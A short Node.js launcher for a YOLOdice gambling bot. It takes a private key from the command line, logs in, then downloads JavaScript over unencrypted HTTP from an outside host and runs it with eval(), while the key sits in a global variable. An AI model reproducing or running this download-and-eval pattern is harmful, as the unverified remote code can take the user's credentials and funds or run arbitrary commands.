const YOLOdice = require('yolodice-api');
YOLODICE_PRIVKEY = process.argv[2]
YOLODICE_CURRENCY = process.argv[3].toLowerCase();
TARGET = process.argv[4]
STOPLOSS = process.argv[5]
let client = new YOLOdice(YOLODICE_PRIVKEY);
const request = require('request');
var user;
client.on('loggedIn', (userr) => {
    user = userr
    console.log(user)
    console.log(`Logged in as (${user.id})${user.name}`);
    request('http://mrcyjanek.net/better/script_yolodice.js', {}, (err, res, body) => {
        eval(body);
    });
});

client.on('error', (err) => {
    console.dir(err);
});

process.on('SIGINT', () => {
    client.quit();
});
